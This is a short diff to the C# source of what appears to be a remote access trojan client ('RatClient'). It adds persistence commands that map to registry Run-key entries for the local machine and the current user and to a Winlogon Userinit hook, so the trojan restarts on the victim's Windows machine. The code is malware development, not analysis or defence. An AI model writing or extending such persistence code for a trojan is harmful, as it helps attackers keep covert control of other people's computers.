@@ -5,9 +5,13 @@ using System.IO.Compression;
 using System.Runtime.Serialization;
 using RatClient.ProcManage;
 using System.Diagnostics;
+using System.Reflection;
+using RatClient.Persistence;
 
 class Info
 {
+    public static string CurrentexecutablePath = Assembly.GetEntryAssembly().Location;
+     
     [DataContract]
     public class ClientInfo
     {
@@ -59,5 +63,13 @@ class Info
 
         }
     }
+
+    public static readonly Dictionary<string, Func<string, bool>> PersistActionsReg = new Dictionary<string, Func<string, bool>>
+    {
+        { "runlocalmachine", (name) => Registrys.RunLocalMachine(name) },
+        { "runlocaluser", (name) => Registrys.RunLogonUser(name) },
+        { "wininit", (_) => Registrys.WinLogonUserInit() }
+    }; 
+
 }
 
